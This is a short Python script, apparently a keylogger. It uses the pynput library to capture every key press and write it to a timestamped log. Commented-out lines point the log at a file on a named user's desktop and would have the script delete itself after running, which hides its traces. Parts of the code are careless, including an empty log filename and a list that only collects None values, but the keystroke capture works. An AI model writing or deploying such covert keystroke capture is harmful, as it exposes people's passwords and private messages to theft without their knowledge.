from pynput.keyboard import Key, Listener
import logging
from os import remove
from sys import argv


def main():
    log_dir = "C:/users/samsm/desktop/"
    f = ""
    output = []
    # logging.basicConfig(filename=(log_dir + "keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
    logging.basicConfig(filename=f, level=logging.DEBUG, format='%(asctime)s: %(message)s')

    def on_press(key):
        output.append(logging.info(str(key)))

    with Listener(on_press=on_press) as listener:
        listener.join()

    # remove(argv[0])


if __name__ == "__main__":
    main()



